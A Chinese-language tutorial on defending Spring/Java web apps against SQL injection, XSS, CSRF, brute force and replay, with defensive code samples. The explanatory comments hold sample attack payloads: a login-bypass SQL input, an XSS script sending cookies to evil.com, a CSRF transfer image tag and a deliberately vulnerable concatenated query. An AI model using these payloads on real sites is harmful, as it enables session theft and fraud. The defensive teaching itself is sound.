# 常見攻擊防禦

## SQL 注入（SQL Injection）

```java
// 攻擊原理：
// 用戶輸入：' OR '1'='1
// 惡意 SQL：SELECT * FROM users
//           WHERE username = '' OR '1'='1' AND password = ''
// 結果：繞過密碼驗證！

// ❌ 字串拼接（危險！）
String sql = "SELECT * FROM users WHERE username = '"
    + username + "' AND password = '" + password + "'";

// ✅ 預處理語句（Prepared Statement）
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, username);
ps.setString(2, password);

// ✅ MyBatis 使用 #{}（預處理）而不是 ${}（拼接）
// Mapper.xml：
// SELECT * FROM users WHERE username = #{username}   ✅
// SELECT * FROM users WHERE username = '${username}' ❌

// ✅ JPA（自動預處理）
userRepository.findByUsernameAndPassword(username, hashedPassword);

// ✅ 動態列名使用白名單
public List<User> getUsers(String orderBy) {
    Set<String> allowedColumns = Set.of("id", "username", "created_at");
    if (!allowedColumns.contains(orderBy)) {
        throw new IllegalArgumentException("不允許的排序字段: " + orderBy);
    }
    return userRepository.findAllOrderBy(orderBy);
}
```

## XSS（跨站腳本攻擊）

```java
// 攻擊原理：
// 攻擊者在評論中輸入：
// <script>document.location='http://evil.com?c='+document.cookie</script>
// 其他用戶訪問頁面時，腳本執行，Cookie 被竊取！

// 防禦 1：Content Security Policy（CSP）
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data: https:; " +
                "frame-ancestors 'none'"
            )
        )
        .frameOptions(frame -> frame.deny())
        .xssProtection(xss -> xss.enable())
        .contentTypeOptions(Customizer.withDefaults())
    );
    return http.build();
}

// 防禦 2：輸入驗證與清理（OWASP Java HTML Sanitizer）
@Component
public class InputSanitizer {

    private final PolicyFactory policy = Sanitizers.FORMATTING
        .and(Sanitizers.LINKS);

    public String sanitize(String input) {
        return policy.sanitize(input);
        // <script>alert('xss')</script> → 被移除
        // <b>粗體</b> → 保留
    }
}
```

## CSRF（跨站請求偽造）

```
攻擊原理：
  用戶登入了銀行網站（有 Cookie Session）
  同時訪問了惡意網站，惡意網站有：
  <img src="http://bank.com/transfer?to=hacker&amount=10000">
  瀏覽器自動帶上銀行的 Cookie，請求成功！

防禦方式：

方式 1：CSRF Token（傳統表單）
  服務器生成隨機 Token，放入表單隱藏字段
  每次請求都驗證 Token，惡意網站無法知道這個 Token！

方式 2：SameSite Cookie（現代方案）
  Set-Cookie: session=xxx; SameSite=Strict
  Strict：Cookie 只在同源請求中發送（跨站完全不發）

方式 3：JWT + 無 Cookie（前後端分離）
  Token 放 Authorization Header，不用 Cookie
  惡意網站無法設定 Authorization Header！
  → 天然防 CSRF，可以關閉 CSRF 保護
```

```java
// 前後端分離 + JWT：直接關閉 CSRF
http.csrf(csrf -> csrf.disable());

// 傳統 MVC + Session：使用 CSRF Token
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    // JS 可以讀取 XSRF-TOKEN Cookie
    // 前端請求時在 Header 帶上：X-XSRF-TOKEN: 讀取到的值
);
```

## 其他重要攻擊防禦

```java
// 1. 暴力破解（Brute Force）防禦
@Service
@RequiredArgsConstructor
public class LoginAttemptService {

    private final StringRedisTemplate redisTemplate;
    private static final int  MAX_ATTEMPTS   = 5;
    private static final long LOCK_DURATION  = 30; // 分鐘

    public void loginFailed(String username, String ip) {
        String key      = "login_attempt:" + ip + ":" + username;
        Long   attempts = redisTemplate.opsForValue().increment(key);

        if (attempts == 1) {
            redisTemplate.expire(key, LOCK_DURATION, TimeUnit.MINUTES);
        }

        if (attempts >= MAX_ATTEMPTS) {
            log.warn("帳號 {} (IP: {}) 已達登入失敗上限，鎖定 {} 分鐘",
                username, ip, LOCK_DURATION);
        }
    }

    public boolean isBlocked(String username, String ip) {
        String key      = "login_attempt:" + ip + ":" + username;
        String attempts = redisTemplate.opsForValue().get(key);
        return attempts != null && Integer.parseInt(attempts) >= MAX_ATTEMPTS;
    }

    public void loginSucceeded(String username, String ip) {
        redisTemplate.delete("login_attempt:" + ip + ":" + username);
    }
}

// 2. 敏感數據加密（AES-256-GCM）
@Component
public class FieldEncryptor {

    @Value("${app.encrypt.key}")
    private String encryptKey;

    public String encrypt(String plainText) throws Exception {
        SecretKey key    = new SecretKeySpec(
            Base64.getDecoder().decode(encryptKey), "AES");
        Cipher    cipher = Cipher.getInstance("AES/GCM/NoPadding");

        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));

        byte[] encrypted = cipher.doFinal(plainText.getBytes());
        byte[] result    = new byte[iv.length + encrypted.length];
        System.arraycopy(iv,        0, result, 0,          iv.length);
        System.arraycopy(encrypted, 0, result, iv.length,  encrypted.length);

        return Base64.getEncoder().encodeToString(result);
    }

    public String decrypt(String encryptedText) throws Exception {
        byte[] data      = Base64.getDecoder().decode(encryptedText);
        byte[] iv        = Arrays.copyOfRange(data, 0,  12);
        byte[] encrypted = Arrays.copyOfRange(data, 12, data.length);

        SecretKey key    = new SecretKeySpec(
            Base64.getDecoder().decode(encryptKey), "AES");
        Cipher    cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));

        return new String(cipher.doFinal(encrypted));
    }
}

// 3. 接口冪等性防重放攻擊
@RestController
public class PaymentController {

    @PostMapping("/pay")
    public ResponseEntity<?> pay(
            @RequestHeader("Idempotency-Key") String idempotencyKey,
            @RequestBody PaymentRequest request) {

        String  redisKey = "idempotency:" + idempotencyKey;
        Boolean isNew    = redisTemplate.opsForValue()
            .setIfAbsent(redisKey, "processing", 24, TimeUnit.HOURS);

        if (!Boolean.TRUE.equals(isNew)) {
            String result = redisTemplate.opsForValue().get(redisKey);
            return ResponseEntity.ok(result);
        }

        PaymentResult result = paymentService.pay(request);
        redisTemplate.opsForValue().set(redisKey,
            JSON.toJSONString(result), 24, TimeUnit.HOURS);

        return ResponseEntity.ok(result);
    }
}
```
